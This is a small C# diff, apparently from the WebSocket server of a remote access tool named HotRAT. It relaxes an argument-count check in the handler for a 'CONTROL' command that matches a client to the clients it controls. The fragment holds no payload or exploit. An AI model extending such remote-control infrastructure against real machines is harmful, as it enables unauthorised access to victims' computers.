@@ -72,7 +72,7 @@ namespace HotRAT.WSServer.Models
                             }
                             break;
                         case "CONTROL":
-                            if (flags.Length == 2)
+                            if (flags.Length >= 2)
                             {
                                 var targetClient = Runtimes._clients.Values
                                     .FirstOrDefault(c => c.Controlled.Contains(cid));
